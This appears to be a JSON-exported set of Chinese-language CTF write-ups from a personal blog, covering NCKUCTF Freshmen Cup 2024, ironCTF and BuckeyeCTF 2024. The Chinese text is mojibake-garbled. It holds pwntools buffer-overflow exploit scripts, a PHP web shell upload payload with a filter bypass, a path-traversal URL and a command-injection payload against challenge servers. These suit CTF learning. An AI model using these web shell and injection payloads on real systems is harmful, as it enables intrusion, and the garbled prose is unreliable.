ğŸ©¸ï½œè¿æ–°ç›ƒï¼†é¦–æ®ºå…¬å‘Š çš„é »é“ä¸»é¡Œå…§\næ¯”è¼ƒæ©Ÿè»Šçš„é»æ˜¯ åŸºæœ¬ä¸Šè¦å…¨è¢å¹•æ‰çœ‹å¾—åˆ°å¾Œé¢çš„é‚£ä¸²æè¿°\nflag: NCKUCTF{Welcome to 2024 NCKUCTF Freshmen Cup!}\nWelcome / å›é¥‹è¡¨å–® #\rè«‹å¤§å®¶å»ä¹–ä¹–å¡«è¡¨å–® ç”šè‡³åªæœ‰27å€‹äººè§£å®Œé€™é¡Œ\nflag: NCKUCTF{Thanks for your playing, have a nice day!}\nPwn /[æ–°æ‰‹å‹å–„] Overflow Tutorial #\rè€ƒäº† integer overflow é‚„æœ‰overwrite dataçš„æ¦‚å¿µ (æ‡‰è©²æ˜¯å«é€™å€‹æ²’éŒ¯\nç°¡å–®ä¾†è¬›å°±æ˜¯æ•´æ•¸æº¢å‡ºè·Ÿè¤‡å¯«\nç¬¬äºŒå€‹è¤‡å¯«çš„éƒ¨åˆ†å¦‚æœæ‡¶å¾—ç®—å…·é«”å‰é¢è¦é€å¤šå°‘å­—å…ƒçš„è©±ï¼Œå¯ä»¥å°±ç›´æ¥å…ˆç„¡è…¦å™´ä¸€å †Aï¼Œç„¶å¾Œå†å»æ…¢æ…¢ç¸®æ¸›å°±å¥½\npayload: 251\rAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAANCKUCTF flag: NCKUCTF{H0p3_U_LeaRNed_Some_concept_Ab0ut_Sof7w4r3_sEcur1tY_N0w_0a05f6c72945fc781e1a0f5b54dc285a}\nPwn / Every pwner\u0026rsquo;s first challenge #\ré€ébuffer overflowä¾†è¦†è“‹ return address çš„å€¼ï¼Œè®“ä»–æœ€å¾Œè®Šæˆæ˜¯å›åˆ° call_me function\næ‰¾ win function çš„è©±å¯ä»¥ç”¨ gdb çš„ info func æˆ–æ˜¯ IDA ç›´æ¥æ‰“é–‹çœ‹éƒ½å¯ä»¥\nç„¶å¾Œå…·é«”å‰é¢è¦å…ˆé€å¤šå°‘å­—å…ƒæ‰èƒ½è“‹åˆ° ret address çš„è©±å¯ä»¥é€é pwn tool çš„ cyclic ï¼Œå…ˆå¤šé€ä¸€å¤§å †å€¼é€²å»ï¼Œå†é€éGDBä¾†æŸ¥çœ‹å ±éŒ¯æ™‚çš„ $rsp å…§å®¹ï¼Œæœ€å¾Œå†é€é cyclic_find(\u0026quot;$rspçš„å€¼\u0026quot;) å³å¯æ‰¾å‡ºè¦è¦†è“‹å¤šå°‘\nfrom pwn import * import sys import time context.log_level = \u0026#34;debug\u0026#34; context.arch = \u0026#34;amd64\u0026#34; def one_gadget(filename: str) -\u0026gt; list: return [ int(i) for i in __import__(\u0026#39;subprocess\u0026#39;).check_output( [\u0026#39;one_gadget\u0026#39;, \u0026#39;--raw\u0026#39;, filename]).decode().split(\u0026#39; \u0026#39;) ] if len(sys.argv) == 1: r = process(\u0026#34;./chal\u0026#34;) if args.GDB: gdb.attach(r, \u0026#39;b *0x401228\u0026#39;) elif len(sys.argv) == 3: r = remote(sys.argv[1], sys.argv[2]) else: print(\u0026#34;Usage: python3 {} [GDB | REMOTE_IP PORT]\u0026#34;.format(sys.argv[0])) sys.exit(1) s = lambda data :r.send(data) sa = lambda x, y :r.sendafter(x, y) sl = lambda data :r.sendline(data) sla = lambda x, y :r.sendlineafter(x, y) ru = lambda delims, drop=True :r.recvuntil(delims, drop) uu32 = lambda data,num :u32(r.recvuntil(data)[-num:].ljust(4,b\u0026#39;\\x00\u0026#39;)) uu64 = lambda data,num :u64(r.recvuntil(data)[-num:].ljust(8,b\u0026#39;\\x00\u0026#39;)) leak = lambda name,addr :log.success(\u0026#39;{} = {}\u0026#39;.format(name, addr)) l64 = lambda :u64(r.recvuntil(\u0026#34;\\x7f\u0026#34;)[-6:].ljust(8,b\u0026#34;\\x00\u0026#34;)) l32 = lambda :u32(r.recvuntil(\u0026#34;\\xf7\u0026#34;)[-4:].ljust(4,b\u0026#34;\\x00\u0026#34;)) # payload --\u0026gt; win = 0x401196 # payload= cyclic(100) payload= cyclic(40) + p64(win) sla(b\u0026#34;Welcome to NCKUCTF Freshmen cup!\\n\u0026#34;, payload) r.interactive() flag: NCKUCTF{Y0ur_Pwn_J0urn3y_S74rts_FrOM_noW!_19999da0cf8e994642f89c8015ca5d05}\nReverse / âœŒï¸âœŠâœ‹ #\rç›´æ¥åŸ·è¡Œå°±æœ‰flagäº†ï¼Œæœ¬ä¾†é‚„ä»¥ç‚ºæ˜¯é¡Œç›®å¯«çˆ†äº†?\nflag: NCKUCTF{w0W_yOU_4re_vErY_gooD_47_ROck_PAPeR_5cS50RS!!}\nReverse / Youtube Video Recommendation Tool #\rç›´æ¥strings æŸ¥çœ‹æœƒè¼¸å‡ºçš„å…¨éƒ¨yté€£æ¥ï¼Œæœ€å¾Œç™¼ç¾å…¶ä¸­ä¸€å€‹çš„æ¨™é¡Œå°±æ˜¯flagäº†\nflag: NCKUCTF{w4I7_a_MiNU73_kaITÅ_kiddOoa4}\nReverse / Baby Python Assembly #\råŸºæœ¬ä¸ŠæŠŠå…©æ®µcodeéƒ½å¡çµ¦GPTä»–å°±æœƒå¹«ä½ ç”Ÿå‡ºåŸæœ¬çš„listäº†\nè¬è¬GPTæ‹¯æ•‘æ‰€æœ‰æ‡¶å¾—çœ‹ä¸æœƒçµ„èªçš„æˆ‘\nä½†æœ€å¥½é‚„æ˜¯å»ä¹–ä¹–çœ‹çµ„èªå•¦å“ˆå“ˆ\nè·ŸGPTçš„å°è©±éç¨‹\nflag: NCKUCTF{baby_pyth0N_1s_s0_EzZzzzzZZzzzzzZzzzz_Vincent55_is_so_Electric_OrzZzZZ_a8b40af05731c9612abeec69772de8e8ca8be759000d272e89f9ea5d413b2477}\nWeb / å¥½é§­å®¢çš„ç¶²ç«™ #\rç°¡å–®ä¾†è¬›å°±æ˜¯å¡web shellï¼Œä½†è½èªªæ˜¯é¡Œç›®å‡ºçˆ†äº†æ‰æœƒè¢«ç°¡å–®ç¹é\nåœ¨ä¸Šå‚³åœ–ç‰‡çš„éƒ¨åˆ†å…ˆé€é burp suite æ””ä¸‹ç™¼é€çš„å°åŒ…ï¼Œé€åˆ° repeater ä¸­é–‹å§‹ä¿®æ”¹\né¦–å…ˆæœƒæ“‹æ‰é™„æª”åç‚º .php çš„å…§å®¹ï¼Œä½†é€™éƒ¨åˆ†å¯ä»¥è®Šæˆé€ .Php ä¾†ç¹é\nå†ä¾†æ˜¯å…§å®¹éƒ¨åˆ†ä¸èƒ½ç›´æ¥æ”¾shell codeï¼Œå‰é¢è¦å…ˆåŠ ä¸€æ®µå…è¨±æ ¼å¼çš„Magic Numbersä¾†ç¹éï¼Œé€™é‚Šæˆ‘æ˜¯ç”¨gifçš„\nå†ä¾†å°±åˆ°ä¸Šå‚³åœ–ç‰‡çš„åœ°æ–¹å¾Œé¢çš„cmdåŠ ä¸Šæƒ³åŸ·è¡Œçš„æŒ‡ä»¤å°±å¯ä»¥äº†\nhttp://chall.nckuctf.org:29103/uploads/aaaa_test.Php?cmd=å¡é€™é‚Š\npayload: GIF87a \u0026lt;?php system($_GET[\u0026#39;cmd\u0026#39;]);?\u0026gt; flag: NCKUCTF{YOu_are_a_g00d_H4cK3r_Just_Lik3_Vincent55_V3ry_N1c3_945dae36ca165274}\nCrypto / E? #\rä¸€æ¨£æ˜¯é GPTæ‹¿åˆ°çš„exp é€™é‚Šç›´æ¥å¥—åŸè©±\nä½ å¯ä»¥ä½¿ç”¨ ä¸­åœ‹é¤˜æ•¸å®šç†ï¼ˆCRTï¼‰ ä¾†è§£é€™å€‹å•é¡Œï¼Œå‰ææ˜¯é€™äº› e1 å’Œ e2 æ˜¯äº’è³ªçš„ã€‚\nä½ æœ‰å…©å€‹æ–¹ç¨‹å¼ï¼š c1 = pow(m, e1, n)\nc2 = pow(m, e2, n)\nå¦‚æœä½ çŸ¥é“ c1 å’Œ c2 ç›¸ç­‰ï¼Œä¸¦ä¸”çŸ¥é“ e1 å’Œ e2ï¼Œé‚£éº¼ä½ å¯ä»¥åˆ©ç”¨æ“´å±•çš„æ­å¹¾é‡Œå¾—ç®—æ³•ä¾†æ±‚è§£ mã€‚\nåˆ©ç”¨æ“´å±•çš„æ­å¹¾é‡Œå¾—ç®—æ³•ä¾†æ‰¾åˆ° s1 å’Œ s2ï¼Œä½¿å¾—ï¼š\ns1 * e1 + s2 * e2 = 1\næ ¹æ“šé€™å€‹çµæœï¼Œä½ å¯ä»¥è¨ˆç®—å‡ºï¼š\nm â‰¡ (pow(c1, s1, n) * pow(c2, s2, n)) % n\né€™æ¨£å°±èƒ½ç®—å‡º m çš„å€¼ã€‚\nimport math # æ“´å±•æ­å¹¾é‡Œå¾—ç®—æ³• def extended_gcd(a, b): if b == 0: return a, 1, 0 gcd, x1, y1 = extended_gcd(b, a % b) x = y1 y = x1 - (a // b) * y1 return gcd, x, y # ä¸»è¦è§£ç¢¼é‚è¼¯ def decrypt(c1, c2, e1, e2, n): gcd, s1, s2 = extended_gcd(e1, e2) if gcd != 1: raise ValueError(\u0026#34;e1 å’Œ e2 å¿…é ˆäº’è³ª\u0026#34;) # å¦‚æœ s1 æ˜¯è² æ•¸ï¼Œå°‡å…¶è½‰æ›ç‚ºæ­£æ•¸ if s1 \u0026lt; 0: c1 = pow(c1, -s1, n) c1 = pow(c1, -1, n) else: c1 = pow(c1, s1, n) # å¦‚æœ s2 æ˜¯è² æ•¸ï¼Œå°‡å…¶è½‰æ›ç‚ºæ­£æ•¸ if s2 \u0026lt; 0: c2 = pow(c2, -s2, n) c2 = pow(c2, -1, n) else: c2 = pow(c2, s2, n) # å¾—åˆ°åŸå§‹çš„ m m = (c1 * c2) % n return m # ç¤ºä¾‹ n = 3233 # ä¸€å€‹æ¨¡æ•¸ n m = 42 # åŸå§‹æ¶ˆæ¯ e1 = 3 # ç¬¬ä¸€å€‹å…¬é–‹æŒ‡æ•¸ e2 = 7 # ç¬¬äºŒå€‹å…¬é–‹æŒ‡æ•¸ # åŠ å¯†å¾—åˆ°çš„å¯†æ–‡ c c1 = pow(m, e1, n) c2 = pow(m, e2, n) # ç”¨ c1 å’Œ c2 ä¾†è§£å¯† è§£å¯†å¾Œçš„_m = decrypt(c1, c2, e1, e2, n) print(f\u0026#34;è§£å¯†å¾Œçš„æ¶ˆæ¯ m = {è§£å¯†å¾Œçš„_m}\u0026#34;) æœªè§£å‡º #\råƒè€ƒWrite Up\nReverse / 2048?? #\rå› ç‚ºä¸æœƒç”¨dnspyä¸‹æ–·é»æŸ¥çœ‹flagçš„å…§å®¹ï¼Œæ‰€ä»¥æœ€å¾Œé‚„æ˜¯ç”¨CE\né€édnspyæŸ¥çœ‹å‹åˆ©æ¢ä»¶å¾Œï¼Œå¯ä»¥ç™¼ç¾æœ€çµ‚ç›®æ¨™æ˜¯è¦å‡ºç¾æ•¸å­—ç‚º2486çš„æ–¹å¡Šï¼Œä½†ç†è«–ä¸Šä¸å¯èƒ½é”æˆï¼Œå› æ­¤\nCE å•Ÿå‹•!! æ…¢æ…¢å°‹æ‰¾å¾Œæœƒç™¼ç¾å®ƒå„²å­˜çš„æ–¹æ³•æ˜¯æ ¹æ“šæ¯ä¸€æ ¼ä½ç½®ä¾†å­˜ï¼Œä¸æ˜¯çœ‹è‡ªå·±æ–¹å¡Šçš„æ•¸å­—(?)\nä¾‹å¦‚èªªå·¦ä¸‹çš„æ ¼å­ç¾åœ¨æ˜¯2ï¼Œä½†ä½ æŠŠ2ç§»èµ°å¾Œå°±æœƒæ˜¯0\næ—¢ç„¶æ‰¾åˆ°å…§å­˜ä½ç½®å¾Œï¼Œå†ä¾†å°±åªéœ€è¦æŠŠå®ƒæ”¹æˆ2486å°±å¯ä»¥äº†\n// Token: 0x0600001C RID: 28 public bool checkGoal() { for (int i = 0; i \u0026lt; 4; i++) { for (int j = 0; j \u0026lt; 4; j++) { if (this.iBoard[i][j] == this.goal) { return true; } } } return false; } // Token: 0x0400000E RID: 14 private int goal = 2486; flag: NCKUCTF{WHo_I5_RO63R?}\nWeb / Just Image #\ræ¯”è³½çš„æ™‚å€™æƒ³ä¸åˆ°æ²’æœ‰.è¦æ€éº¼å›åˆ°æ ¹ç›®éŒ„å°±æ²’è§£å‡ºä¾†ï¼Œçµæœ//å°±å¯ä»¥äº†qq\nå…ˆç›´æ¥å»æŸ¥çœ‹æœƒå‹•çš„é³¥é³¥åœ–ç‰‡ç¶²å€ï¼Œç™¼ç¾æœ€å¾Œçš„æ ¼å¼æ˜¯base64åŠ å¯†å¾Œçš„ï¼Œå› æ­¤æˆ‘å€‘åªéœ€è¦å°‡ç›®æ¨™è·¯å¾‘ä¹Ÿbase64éå¾Œå†é€éå»å°±å¥½äº†\nhttp://chall.nckuctf.org:29202/img/Ly9mbGFn æœ€å¾Œå†æŠŠç¶²ç«™Ctrl+så­˜ä¸‹ä¾†ï¼Œåœ¨åŸæœ¬çš„ç¶²ç«™è®€ä¸å‡ºä¾†å¾—åŸå› æ˜¯å› ç‚ºä»–ä¸æ˜¯åœ–ç‰‡æª”ï¼Œå­˜æˆtxtä¹‹é¡çš„å°±å¯ä»¥äº†\nflag: NCKUCTF{os.path.join can join to root}\nMisc / Double Exploit #\rå¾ˆé…·çš„ä¸€é¡Œï¼Œç¾åœ¨æ‰çŸ¥é“åŸä¾†é€™äº›æ±è¥¿éƒ½å¯ä»¥æ’ˆï¼Œå–µ\nåŸå§‹ç¢¼å¦‚ä¸‹\n\u0026lt;?php require \u0026#34;secret.php\u0026#34;; if (isset($_GET[\u0026#39;payload\u0026#39;])){ $payload=$_GET[\u0026#39;payload\u0026#39;]; if (strlen($payload)\u0026gt;6) die(\u0026#34;Bad bad cat\u0026#34;); $result=shell_exec(\u0026#34;./pwn_me \u0026#34;.$payload); if ($result==\u0026#34;Meowing Whale\u0026#34;){ echo $flag; } } highlight_file(\u0026#34;index.php\u0026#34;); å…ˆæŸ¥çœ‹é¡Œç›®æœƒç™¼ç¾ï¼Œpayloadçš„éƒ¨åˆ†åªèƒ½è¼¸å…¥6å€‹å­—å…ƒã€ æœ€å¾Œçš„resultè¦ç‚º\u0026quot;Meowing Whale\u0026quot;\né¦–å…ˆèƒ½é€éhttp://chall.nckuctf.org:29205/pwn_meï¼Œä¾†ä¸‹è¼‰pwn_meå»åšåˆ†æ\né€éIDAæŸ¥çœ‹å¾Œæœƒç™¼ç¾ï¼Œè¼¸å…¥çš„ç¬¬äºŒå­—å…ƒç‚º#å‰‡æœƒè¼¸å‡ºæˆ‘å€‘è¦çš„Meowing\nå†ä¾†é€éå­˜å–http://chall.nckuctf.org:29205/Dockerfileï¼Œå¯ä»¥ç™¼ç¾é‚„å¯ä»¥å­˜å–ä¸€å€‹å«fçš„æª”æ¡ˆï¼Œä¸€æ¨£æŠŠå®ƒä¸‹è¼‰ä¸‹ä¾†ï¼Œç™¼ç¾åŸ·è¡Œå¾Œå°±æœƒè¼¸å‡ºWhale\næ±è¥¿éƒ½æ‰¾åˆ°äº†ï¼Œæœ€å¾Œå°±æŠŠå®ƒå€‘ä¸²åœ¨ä¸€èµ·å°±å¯ä»¥äº† payload=0%23;.%2ff\nä¸çŸ¥é“ç‚ºç”šéº¼payloadç›´æ¥é€ 0#;./f æœƒå¤±æ•—ï¼Œè¦è®Šæˆé€urlç·¨ç¢¼å¾Œçš„å½¢å¼æ‰å¯ä»¥\nflag: NCKUCTF{my_first_pwn+web+rev_XD}\nç¸½çµ #\rè€¶å¯«å®Œäº† æ’ç‰ˆä¸€æ¨£å¾ˆé†œ\né€™æ¬¡å¥½å»¢å–” æ˜å¹´é‚„æ‰“ å¥½æ‰“ä¸€ç›´æ‰“\n","date":"14 October 2024","externalUrl":null,"permalink":"/posts/009_weeklyctf04/","section":"Posts","summary":"é€™æ¬¡æ‰“çš„æ˜¯æˆå¤§è³‡å®‰ç¤¾è¿æ–°æ¯","title":"æˆå¤§è³‡å®‰ç¤¾è¿æ–°æ¯ CTF","type":"posts"},{"content":"\rplus ultra\rå‰è¨€ #\ré€™ç¦®æ‹œæ¯”è¼ƒå¿™ å¾ˆå¤šäº‹æƒ…æ“ åœ¨ä¸€èµ·\näº‹å¾Œæª¢è¨æ¯”è¼ƒæ²’æœ‰æ™‚é–“çœ‹ æ‰€ä»¥é€™ç¦®æ‹œå°±ç¨å¾®æ°´ä¸€å‘¨å§æ¬¸å˜¿\næœ¬æ¬¡æ’å 444/1033 è§£å‡º3é¡Œ qq è§£å‡º #\rWarmup / Welcome #\ré€²dcå°±çœ‹å¾—åˆ°ã„Œ\nWarmup / Math Gone Wrong #\rç°¡å–®ä¾†è¬›å°±æ˜¯è¦è®“ä»¥ä¸‹æˆç«‹\nn1*10+n2*10 != (n1+n2)*10\nn1ã€n2è¼¸å…¥å°æ•¸é»å°±å¯ä»¥é †åˆ©é€šéã„Œ\nWarmup / Introspection #\ré¡Œç›®code\nchar buf[1008]; printf(\u0026#34;\u0026gt;\u0026gt; \u0026#34;); read(0, buf, 1008); ç°¡å–®ä¾†è¬›å°±æ˜¯å¦‚æœå‰›å¥½è¼¸å…¥1008å€‹å­—å…ƒï¼ŒæœƒæŠŠæœ€å¾Œnull byteä¹Ÿè“‹æ‰\nå› æ­¤è¼¸å‡ºçš„æ™‚å€™å°±æœƒä¸çŸ¥é“bufçš„å…§å®¹å·²ç¶“çµæŸï¼Œæœƒæ¥çºŒæŠŠå¾Œé¢flag[]å…§çš„å…§å®¹ä¹Ÿå™´å‡ºä¾†\nç¸½çµ #\ræœ€è¿‘æ¯”è¼ƒå¿™ å¾ˆå¤šäº‹æƒ…éƒ½æ“ åœ¨é€™å¹¾å‘¨\næ‰€ä»¥é€™æ¬¡æ²’ä»€éº¼çœ‹è³½å¾Œ æœå“© ä¸‹å‘¨ä¸€å®š\n","date":"10 October 2024","externalUrl":null,"permalink":"/posts/008_weeklyctf03/","section":"Posts","summary":"é€™æ¬¡æ‰“çš„æ˜¯iron CTF","title":"æ¯å‘¨CTFè¨ˆç•«03","type":"posts"},{"content":"\rè¿ªå¥§ï¼š\njojoï¼Œä¸€å€‹äººçš„èƒ½åŠ›æ˜¯æœ‰æ¥µé™çš„ æˆ‘å¾çŸ­æš«çš„äººç”Ÿä¸­å­¸åˆ°ä¸€ä»¶äº‹\u0026hellip;\u0026hellip;\nè¶Šæ˜¯ç©CTFï¼Œå°±è¶Šæœƒç™¼ç¾ä¸€å€‹äººçš„èƒ½åŠ›æ˜¯æœ‰æ¥µé™çš„\u0026hellip; é™¤éè¶…è¶Šäººé¡ã€‚\nå–¬ç´æ£®ï¼š\nä½ åˆ°åº•æƒ³èªªä»€éº¼ï¼Ÿ\rå‰è¨€ #\ré€™æ¬¡åƒåŠ çš„æ˜¯ BuckeyeCTF 2024 ï¼Œé€™æ¬¡åœ¨CTFtimeæ‰¾æ¯”è³½çš„æ™‚å€™æœ‰çœ‹åˆ°ä¸€å€‹æœ‰é»é¡ä¼¼picoCTF gymçš„ç¶²ç«™(?\nè£¡é¢ä¹Ÿæ˜¯æ»¿å¤šä»–èˆ‰è¾¦çš„CTFæ­·å±†é¡Œç›®çš„ ç¶²å€é»æˆ‘ æœ‰èˆˆè¶£å¯ä»¥å»ç·´ç¿’\næœ¬æ¬¡æ’å 145/648 è§£å‡º13é¡Œ ä½†éƒ½æ»¿åŸºæœ¬çš„ é¡Œç›® #\rbctf #\rrev #\rflagwatch #\ré€é\rå·¥å…·æŠŠè…³æœ¬é€†å‘æˆå›ä¾†ï¼Œé€éASCIIè§£å¯†å¾—åˆ°åŸå§‹ç¢¼ï¼Œçœ‹å‡ºåŠ å¯†é‚è¼¯\na=[62,63,40,58,39,40,111,63,52,50,53,63,104,48,48,37,3,61,3,55,57,37,48,108,59,59,111,46,33] print(len(a)) for i in range(29): print(chr(a[i]^92),end=\u0026#39;\u0026#39;) # flag bctf{t3chnic4lly_a_keyl0gg3r} text #\rä½¿ç”¨å·¥å…·jd-gui-windows-1.6.6\né€™é¡Œæ˜¯é€éæŠŠæ–‡å­—å†’éšªå¯«æˆjarç„¶å¾Œè¦é€†å‘\nä½†é€éjd-guiå»å¯Ÿçœ‹å¾Œæœƒç™¼ç¾è£¡é¢åŸºæœ¬ä¸Šå°±æ˜¯ä¸€å°if elseä¾†æ§åˆ¶\næ…¢æ…¢é€†å‘å³å¯ é›–ç„¶æ»¿ç°¡å–®ä½†æˆ‘è¦ºå¾—æ»¿å¥½ç©çš„\npayload enter pick up torch go right cross the bridge take rope (CrystalRoom) leave leave go center go down go right use the rope pick up sword (AcrossRiver) leave leave leave leave (EntryHall) go left cut pick up key leave leave go center go down left unlock the door reach through the crack in the rocks the crack in the rocks concealing the magical orb with the flag flag: bctf{P33r_1nT0_tH3_j4r_2_f1nd_Th3_S3cR3Ts_d1463580a690f294}\nbeginner-pwn #\rrunway0 #\rarrayé–‹100ä½†å…è¨±è¼¸å…¥0x100ï¼Œå­˜åœ¨overwriteæ¼æ´ï¼ŒæŠŠæƒ³åŸ·è¡Œçš„æ±è¥¿è“‹åˆ°command[]çš„éƒ¨åˆ†å³å¯ \u0026lsquo;a\u0026rsquo;*112+cat flag.txt flag: bctf{0v3rfl0w_th3_M00m0ry_2d310e3de286658e}\nrunway1 #\ré€éoverflowæŠŠwin functionçš„addressè¦†è“‹åˆ°return addressï¼Œä¹Ÿå°±æ˜¯espçš„å€¼\nfrom pwn import * import sys import time context.log_level = \u0026#34;debug\u0026#34; context.arch = \u0026#34;amd64\u0026#34; def one_gadget(filename: str) -\u0026gt; list: return [ int(i) for i in __import__(\u0026#39;subprocess\u0026#39;).check_output( [\u0026#39;one_gadget\u0026#39;, \u0026#39;--raw\u0026#39;, filename]).decode().split(\u0026#39; \u0026#39;) ] if len(sys.argv) == 1: r = process(\u0026#34;./runway1\u0026#34;) if args.GDB: gdb.attach(r,\u0026#39;b *(0x804928f)\u0026#39;) elif len(sys.argv) == 3: r = remote(sys.argv[1], sys.argv[2]) else: print(\u0026#34;Usage: python3 {} [GDB | REMOTE_IP PORT]\u0026#34;.format(sys.argv[0])) sys.exit(1) s = lambda data :r.send(data) sa = lambda x, y :r.sendafter(x, y) sl = lambda data :r.sendline(data) sla = lambda x, y :r.sendlineafter(x, y) ru = lambda delims, drop=True :r.recvuntil(delims, drop) uu32 = lambda data,num :u32(r.recvuntil(data)[-num:].ljust(4,b\u0026#39;\\x00\u0026#39;)) uu64 = lambda data,num :u64(r.recvuntil(data)[-num:].ljust(8,b\u0026#39;\\x00\u0026#39;)) leak = lambda name,addr :log.success(\u0026#39;{} = {}\u0026#39;.format(name, addr)) l64 = lambda :u64(r.recvuntil(\u0026#34;\\x7f\u0026#34;)[-6:].ljust(8,b\u0026#34;\\x00\u0026#34;)) l32 = lambda :u32(r.recvuntil(\u0026#34;\\xf7\u0026#34;)[-4:].ljust(4,b\u0026#34;\\x00\u0026#34;)) # payload --\u0026gt; win = 0x80491E6 payload= cyclic(76) + p64(win) sla(\u0026#34;What is your favorite food?\\n\u0026#34;,payload) r.interactive() run2 #\ræœ¬ä¾†é‚„ä»¥ç‚ºè¦ä¸²ROPå“ˆå“ˆ ä¸­é–“å¡å¾ˆä¹…ï¼Œçµæœå¾Œé¢æ‰ç™¼ç¾ä»–æ˜¯x32çš„æª”æ¡ˆç„¶å¾Œæˆ‘éƒ½ç”¨p64\nå°è‡´è¦†è“‹æœƒå¤šè£œå…«å€‹0 æ”¹æˆp32å°±æ­£å¸¸==\nä¸€æ¨£æ˜¯overflowåˆ°win funcåªæ˜¯é€™æ¬¡win funcæœƒé¡å¤–æŸ¥çœ‹å…©å€‹ifæ¢ä»¶å¼\nfrom pwn import * import sys import time context.log_level = \u0026#34;debug\u0026#34; context.arch = \u0026#34;amd64\u0026#34; def one_gadget(filename: str) -\u0026gt; list: return [ int(i) for i in __import__(\u0026#39;subprocess\u0026#39;).check_output( [\u0026#39;one_gadget\u0026#39;, \u0026#39;--raw\u0026#39;, filename]).decode().split(\u0026#39; \u0026#39;) ] if len(sys.argv) == 1: r = process(\u0026#34;./runway2\u0026#34;) if args.GDB: gdb.attach(r,\u0026#39;b *(0x80492D3)\u0026#39;) elif len(sys.argv) == 3: r = remote(sys.argv[1], sys.argv[2]) else: print(\u0026#34;Usage: python3 {} [GDB | REMOTE_IP PORT]\u0026#34;.format(sys.argv[0])) sys.exit(1) s = lambda data :r.send(data) sa = lambda x, y :r.sendafter(x, y) sl = lambda data :r.sendline(data) sla = lambda x, y :r.sendlineafter(x, y) ru = lambda delims, drop=True :r.recvuntil(delims, drop) uu32 = lambda data,num :u32(r.recvuntil(data)[-num:].ljust(4,b\u0026#39;\\x00\u0026#39;)) uu64 = lambda data,num :u64(r.recvuntil(data)[-num:].ljust(8,b\u0026#39;\\x00\u0026#39;)) leak = lambda name,addr :log.success(\u0026#39;{} = {}\u0026#39;.format(name, addr)) l64 = lambda :u64(r.recvuntil(\u0026#34;\\x7f\u0026#34;)[-6:].ljust(8,b\u0026#34;\\x00\u0026#34;)) l32 = lambda :u32(r.recvuntil(\u0026#34;\\xf7\u0026#34;)[-4:].ljust(4,b\u0026#34;\\x00\u0026#34;)) # payload --\u0026gt; pop_ebp = 0x804930B win = 0x8049206 payload= cyclic(28) + p64(win)+p32(0xc0ffee)+p64(0x7ab1e) sla(\u0026#34;?\\n\u0026#34;,payload) r.interactive() color #\rå…¶å¯¦ä¸å¤ªæ‡‚é€™é¡Œï¼Œè¼¸å…¥Açš„æ•¸é‡å‰›å¥½æŠŠarrayè“‹æ»¿ï¼Œä¹‹å¾Œå°±æœƒå™´flagäº†\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA # flag bctf{1_d0n7_c4r3_571ll_4_m1d_c010r} crypto #\rnxor #\råšxorå…ˆå¾—å‡ºkeyï¼Œå†å»è§£flagï¼Œéƒ½xorå›å»å°±å¥½\nimport os def xnor_bit(a_bit, b_bit): if a_bit == \u0026#34;1\u0026#34; and b_bit == \u0026#34;1\u0026#34;: return \u0026#34;1\u0026#34; elif a_bit == \u0026#34;1\u0026#34; and b_bit == \u0026#34;0\u0026#34;: return \u0026#34;0\u0026#34; elif a_bit == \u0026#34;0\u0026#34; and b_bit == \u0026#34;1\u0026#34;: return \u0026#34;0\u0026#34; elif a_bit == \u0026#34;0\u0026#34; and b_bit == \u0026#34;0\u0026#34;: return \u0026#34;1\u0026#34; def xnor_byte(a_byte, b_byte): a_bits = get_bits_from_byte(a_byte) b_bits = get_bits_from_byte(b_byte) result_bits = [xnor_bit(a_bits[i], b_bits[i]) for i in range(8)] result_byte = get_byte_from_bits(result_bits) return result_byte def xnor_bytes(a_bytes, b_bytes): assert len(a_bytes) == len(b_bytes) return bytes([xnor_byte(a_bytes[i], b_bytes[i]) for i in range(len(a_bytes))]) def get_bits_from_byte(byte): return list(\u0026#34;{:08b}\u0026#34;.format(byte)) def get_byte_from_bits(bits): return int(\u0026#34;\u0026#34;.join(bits), 2) message = b\u0026#34;Blue is greener than purple for sure!\u0026#34; key = bytes.fromhex(\u0026#39;430e026909e35c169518dc18832d134d156862635e5fc58175fe9dafd88819e22e25bb2326\u0026#39;) flag = \u0026#34;de9289f08d6bcb90359f4dd70e8d95829fc8ffaf90ce5d21f96e3d635f148a68e4eb32efa4\u0026#34; enc_flag = bytes.fromhex(flag) encrypted_hex = \u0026#34;fe9d88f3d675d0c90d95468212b79e929efffcf281d04f0cfa6d07704118943da2af36b9f8\u0026#34; encrypted_bytes = bytes.fromhex(encrypted_hex) def main(): print(f\u0026#34;\\nMessage: {message}\u0026#34;) encrypted = xnor_bytes(message, encrypted_bytes) print(f\u0026#34;key: {encrypted.hex()}\u0026#34;) encrypted_flag = xnor_bytes(enc_flag, key) print(f\u0026#34;Encrypted flag: {encrypted_flag}\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: main() flag: bctf{why_xn0r_y0u_b31ng_so_3xclu51v3}\nrsa #\rå¥½ç”¨ https://www.dcode.fr/rsa-cipher flag: bctf{f4c70r1z3_b3773r_4d3b35e4}\nmisc #\rsanity #\rå…¶å¯¦å°±æ˜¯welcome\ndonut #\rä¸€å€‹é–‹é ­éš¨æ©Ÿçš„æ²³å…§å¡”å•é¡Œ\næˆåŠŸå€ŸåŠ©å·¥äººæ™ºæ…§è§£é–‹\ngitgoo #\rå…ˆé€é gitTool ä¸‹è¼‰ç¶²ç«™æ„å¤–æ´©éœ²çš„.gitå…§å®¹çš„æ±è¥¿\n./gitdumper.sh https://gitgoo.challs.pwnoh.io/.git/ dest-dir ç›´æ¥é€²å»çœ‹ .git/log/HEAD çš„å…§å®¹ ç™¼ç¾åœ¨ç‰ˆæœ¬è™Ÿ9b474236ba20cf3f7d484b76348de51c819c0d65 æœ‰é¡¯ç¤ºæ´©éœ²äº†flag ç„¶å¾Œå°±å›æœ”å°±å¥½ã„Œ\né€²åˆ°dest-diré–‹å§‹æŸ¥çœ‹gitçš„æ±è¥¿\ngit checkout 9b474236ba20cf3f7d484b76348de51c819c0d65\rgit show flag: bctf{1_h4v3_c0mm17m3n7_i55u3s_cf39ab917a7dd092992a8f9b}\nweb #\rfu #\rflagåœ¨åŸå§‹ç¢¼å…§ï¼Œä½†åœ¨ç¶²é å…§ä¸èƒ½F12æˆ–å³éµæŸ¥çœ‹ åœ¨ç¶²å€æœ€å‰é¢åŠ view-source:å³å¯\nforensics #\runknown #\rä¸‹è¼‰ï¼Œæ‰“é–‹\næ²’è§£å‡ºä¾†ä½†å¥½å¥‡çš„ #\rbeginner-pwn / calculatorã€runway3 